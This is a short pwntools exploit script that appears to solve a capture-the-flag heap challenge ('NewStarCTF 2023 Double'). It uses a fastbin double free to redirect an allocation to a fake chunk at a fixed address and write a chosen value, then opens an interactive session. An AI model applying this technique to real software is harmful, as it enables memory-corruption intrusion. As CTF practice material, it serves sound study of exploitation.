from pwn import *
sh = process('./data/bin/heap23_44_NewStarCTF_2023_Double')

def add(idx:int, con:bytes=b'what'):
    sh.recvuntil(b'>')
    sh.sendline(b'1')
    sh.recvuntil(b'idx')
    sh.sendline(str(idx).encode())
    sh.recvuntil(b'ent')
    sh.sendline(con)

def rem(idx:int):
    sh.recvuntil(b'>')
    sh.sendline(b'2')
    sh.recvuntil(b'idx')
    sh.sendline(str(idx).encode())

def chk():
    sh.recvuntil(b'>')
    sh.sendline(b'3')

add(0)
add(1)
rem(0)
rem(1)
rem(0)

add(0, p64(0x602060)) # fd override (chunk 0 now points to fake chunk)
add(1)
add(2)

add(3, p64(0x666)) # fake chunk allocated
chk()
sh.interactive()